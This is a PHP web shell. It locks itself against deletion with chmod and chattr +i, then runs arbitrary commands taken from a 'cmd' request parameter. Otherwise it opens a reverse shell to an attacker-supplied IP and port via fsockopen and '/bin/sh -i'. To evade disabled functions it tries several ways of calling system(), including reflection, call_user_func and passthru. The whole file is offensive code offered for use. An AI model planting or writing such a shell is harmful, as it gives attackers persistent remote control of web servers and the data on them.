<?php

$this_file = __FILE__;
@system("chmod ugo-w $this_file");
@system("chattr +i $this_file");

$cmd = 'cmd';

if(isset($_REQUEST[$cmd])) {

    $command = $_REQUEST[$cmd];
    executeCommand($command);
    
} else if(isset($_REQUEST[$ip]) && !isset($_REQUEST[$cmd])) {

    $ip = $_REQUEST[$ip];
    
    $port = '443';
    
    if(isset($_REQUEST[$port])){
        $port = $_REQUEST[$port];
    }
    
    $sock = fsockopen($ip,$port);
    $command = '/bin/sh -i <&3 >&3 2>&3';
    
    executeCommand($command);
        
}

die();

function executeCommand(string $command) {

    if (class_exists('ReflectionFunction')) {

       $function = new ReflectionFunction('system');
       $function->invoke($command);

    } elseif (function_exists('call_user_func_array')) {

       call_user_func_array('system', array($command));

    } elseif (function_exists('call_user_func')) {

       call_user_func('system', $command);
    
    } else if(function_exists('passthru')) {
        
       ob_start();
       passthru($command , $return_var);
       $output = ob_get_contents();
       ob_end_clean();

    } else if(function_exists('system')){

       system($command);
    }
}